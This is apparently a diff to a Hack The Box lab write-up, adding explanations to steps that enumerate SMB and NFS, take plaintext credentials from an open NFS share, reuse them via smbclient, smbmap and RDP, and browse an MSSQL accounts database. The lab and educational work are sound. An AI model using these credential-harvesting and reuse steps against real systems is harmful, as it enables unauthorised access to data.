@@ -80,7 +80,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 233.95 seconds
 ```
 
-I was a bit lost with this output, but i made a little research about open ports on this machine and wrote thoses courses to continue. 
+I was a bit lost with this output, but I did a little research about open ports on this machine and wrote these courses to continue. 
 
 | Port | Details | Course link | Notes |
 | ---  | ------- | ------|---|
@@ -95,10 +95,11 @@ Let's take a start with enumerating those services.
 
 For SMB i decided to use `enum4linux-ng` a tool for enumerating information from Windows and Samba systems
 
+First, clone the repository.
 ```bash
 git clone https://github.com/cddmp/enum4linux-ng.git && cd enum4linux-ng && pip3 install -r requirements.txt
 ```
-
+Run it with the target IP address.
 ```bash
 ./enum4linux-ng.py 10.129.206.69 -A
 ```
@@ -192,7 +193,7 @@ Server type string: null
 Completed after 7.12 seconds
 ```
 
-observation from this output :
+Observations from this output:
 
 `1. SMB is confirmed active `
 ```
@@ -253,6 +254,9 @@ Server type string: null
 
 #### `NFS enumeration: `
 
+Next, we're going to enumerate NFS.
+
+Run this command to list all available shares.
 ```
 showmount -e 10.129.202.41
 ```
@@ -260,11 +264,14 @@ showmount -e 10.129.202.41
 Export list for 10.129.202.41:
 /TechSupport (everyone)
 ```
+>This shows us an available share on the NFS target
 
+This folder will contain the mounted share.
 ```
 mkdir nfs-target
 ```
 
+Run this command to mount the /TechSupport share in NFS format to the nfs-target directory. 
 ```
 sudo mount -t nfs 10.129.202.41 /TechSupport nfs-target
 ```
@@ -279,6 +286,7 @@ tree
 2 directories, 0 files
 
 ```
+Unfortunately, i was unable to navigate into this folder, so i tried with root rights.
 
 ```
 sudo su
@@ -287,12 +295,14 @@ sudo su
 ┌─[root@htb-xa1tsufdza]─[/home/htb-ac-1595306/mountdir]
 └──╼ # cd nfs-target/
 ```
+Root rights authorized me to go into this folder.
 
 ``` bash
 ┌─[root@htb-xa1tsufdza]─[/home/htb-ac-1595306/mountdir]
 └──╼ # cat *
 ```
 
+Here we found an interesting conversation inside these files.
 ```
 Conversation with InlaneFreight Ltd
 
@@ -346,15 +356,22 @@ So what brings you here today?
 36    }   
 ---
 ```
+Inside this file we can spot Alex's SMTP credentials in plain text.
 
+>5    user="alex"
+>6    password="lol123!mD"
+
+To unmount the share, run this command.
 ```
 sudo umount nfs-target
 ```
 
+Let's try to use these new credentials on the SMB server with smbclient.
 ```
 smbclient -L //10.129.202.41 -U alex
 ```
-
+> -L lists all available shares and stops
+> Without it, it will start the smbclient console.
 ```
 Password for [WORKGROUP\alex]: lol123!mD
 ```
@@ -372,6 +389,7 @@ Password for [WORKGROUP\alex]:
 Reconnecting with SMB1 for workgroup listing.
 ```
 
+Let's use smbmap to see share permissions.
 ```
 smbmap -H 10.129.202.41 -u alex -p 'lol123!mD'
 ```
@@ -382,11 +400,12 @@ smbmap -H 10.129.202.41 -u alex -p 'lol123!mD'
 	----                                                  	-----------	-------
 	ADMIN$                                            	NO ACCESS	Remote Admin
 	C$                                                	NO ACCESS	Default share
-	devshare                                          	READ, WRITE	
+	devshare                                          	READ, WRITE	# <- GOOD FOR US
 	IPC$                                              	READ ONLY	Remote IPC
 	Users                                             	READ ONLY	
 ```
 
+This time, I'm launching smbclient without -L to access the devshare in console mode.
 ```
 smbclient //10.129.202.41/devshare -U alex
 ```
@@ -404,12 +423,10 @@ smb: \> ls
 		10328063 blocks of size 4096. 6101684 blocks available
 ```
 
+Run this to download the file.
 ```
 smb: \> get important.txt 
 getting file \important.txt of size 16 as important.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
-```
-
-```
 exit
 ```
 
@@ -417,23 +434,38 @@ exit
 cat important.txt
 ```
 ```
-sa:87N1ns@slls83
+sa:87N1ns@slls83 # <- Likely credentials.
 ```
 
+NFS enumeration finished, we can start enumerating the last service (RDP).
 
+So I tried to connect with Alex's credentials.
 ```
 xfreerdp /u:alex /p:'lol123!mD' /v:10.129.202.41
 ```
-
+and it worked!
 ![desktop](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/rdp-desktop.png)
+Launch Microsoft SQL Server Management Studio with a right-click, run as administrator.
+
+Here we can enter the password found on the SMB server.
 ![login](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/login.png)
+
+And there is the database (no changes).
 ![connect](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/connect.png)
+
+Looking for the HTB user, I want to find the users database file.
+Go to : `Databases > accounts > dbo.devsacc`
 ![db](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/db.png)
+
+To see the content, we have to right-click and select Edit top 200 rows.
 ![edit-rows](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/edit-rows.png)
+
+Found the HTB user while scrolling.
 ![user](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/user.png)
+
+
 ![succcess](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/success.png)
 
 
 ```
-Databases>accounts>dbo.devsacc
 ```
